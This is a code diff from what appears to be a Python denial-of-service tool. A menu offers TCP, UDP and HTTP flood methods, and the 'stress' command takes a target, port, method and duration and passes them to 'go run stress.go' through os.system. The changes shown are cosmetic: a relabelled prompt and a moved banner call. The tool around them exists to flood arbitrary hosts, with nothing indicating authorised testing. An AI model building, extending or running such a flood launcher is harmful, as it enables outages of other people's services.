@@ -358,7 +358,7 @@ def get_info_l4b():
     target = input()
     stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"PORT     "+Fore.LIGHTGREEN_EX+": "+Fore.LIGHTGREEN_EX)
     port = input()
-    stdout.write("\x1b[38;2;255;20;147m   "+Fore.WHITE+"OPTION   "+Fore.LIGHTGREEN_EX+": "+Fore.LIGHTGREEN_EX+" 1=TCP-FLOOD 2=UDP-FLOOD 3=HTTP-FLOOD(AUTO SSL) \n"+Fore.LIGHTGREEN_EX)
+    stdout.write("\x1b[38;2;255;20;147m"+Fore.WHITE+"METHODE OPTION"+Fore.LIGHTGREEN_EX+": "+Fore.LIGHTGREEN_EX+"1=TCP-FLOOD 2=UDP-FLOOD 3=HTTP-FLOOD(AUTO SSL) \n"+Fore.LIGHTGREEN_EX)
     stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"METHODE  "+Fore.LIGHTGREEN_EX+": "+Fore.LIGHTGREEN_EX)
     methode = input()
     stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"TIME(s)  "+Fore.LIGHTGREEN_EX+": "+Fore.LIGHTGREEN_EX)
@@ -1586,10 +1586,8 @@ def command():
     elif command == "stress":
         target, port, methode, t = get_info_l4b()
         try:
+            picture()
             os.system(f'go run stress.go {target} {port} {methode} 1250 {t} 5')
-            while True:
-                picture()
-                countdown(t)
         except IndexError:
             print('ISI YANG BENER DONG AH...')
             print('METHODE PAKE ANGKA ..... ')
